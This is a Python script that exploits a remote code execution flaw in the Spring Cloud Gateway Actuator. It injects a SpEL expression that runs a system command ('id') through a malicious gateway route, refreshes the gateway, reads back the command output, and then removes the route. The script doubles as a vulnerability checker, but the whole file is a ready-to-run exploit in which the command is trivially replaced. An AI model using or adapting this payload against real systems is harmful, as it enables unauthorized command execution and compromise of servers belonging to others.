import requests
import argparse

headers = {
    "Accept-Encoding": "gzip, deflate",
    "Accept": "*/*",
    "Accept-Language": "en",
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36",
    "Connection": "close",
}
route_id = "hacktest"


def add_malicious_route(base_url):
    print("[*] Adding malicious route...")
    url = f"{base_url}/actuator/gateway/routes/{route_id}"
    payload = {
        "id": route_id,
        "filters": [{
            "name": "AddResponseHeader",
            "args": {
                "name": "Result",
                "value": "#{new String(T(org.springframework.util.StreamUtils).copyToByteArray(T(java.lang.Runtime).getRuntime().exec(new String[]{\"id\"}).getInputStream()))}"
            }
        }],
        "uri": "http://example.com"
    }
    response = requests.post(url, headers={**headers, "Content-Type": "application/json"}, json=payload)
    print(f"[+] Status Code: {response.status_code}, Response: {response.text}")
    return response.status_code == 201


def refresh_gateway(base_url):
    print("[*] Refreshing gateway...")
    url = f"{base_url}/actuator/gateway/refresh"
    response = requests.post(url, headers={**headers, "Content-Type": "application/x-www-form-urlencoded"}, data="")
    print(f"[+] Status Code: {response.status_code}, Response: {response.text}")
    return response.status_code == 200


def get_route_result(base_url):
    print("[*] Fetching route result...")
    url = f"{base_url}/actuator/gateway/routes/{route_id}"
    response = requests.get(url, headers=headers)
    print(f"[+] Status Code: {response.status_code}, Response: {response.text}")
    return response.text if response.status_code == 200 else None


def delete_malicious_route(base_url):
    print("[*] Deleting malicious route...")
    url = f"{base_url}/actuator/gateway/routes/{route_id}"
    response = requests.delete(url, headers=headers)
    print(f"[+] Status Code: {response.status_code}, Response: {response.text}")
    return response.status_code == 200


def main():
    parser = argparse.ArgumentParser(description="Exploit for Spring Cloud Gateway Actuator RCE")
    parser.add_argument("-u", "--url", required=True, help="Target base URL (e.g., 'http://localhost:8080')")
    args = parser.parse_args()

    base_url = args.url.rstrip("/")  # Ensure no trailing slash
    try:
        if not add_malicious_route(base_url):
            print("[-] Failed to add malicious route.")
            print("Detected Vulnerability : False")
            return

        if not refresh_gateway(base_url):
            print("[-] Failed to refresh gateway.")
            print("Detected Vulnerability : False")
            return

        result = get_route_result(base_url)
        if result and "Result" in result:
            print(f"[*] Command Output: {result}")
            print("Detected Vulnerability : True")
        else:
            print("[-] No valid output received or not vulnerable.")
            print("Detected Vulnerability : False")

        delete_malicious_route(base_url)
        refresh_gateway(base_url)
        print("[*] Exploit process completed.")
    except Exception as e:
        print(f"[!] An error occurred: {e}")
        print("Detected Vulnerability : False")


if __name__ == "__main__":
    main()
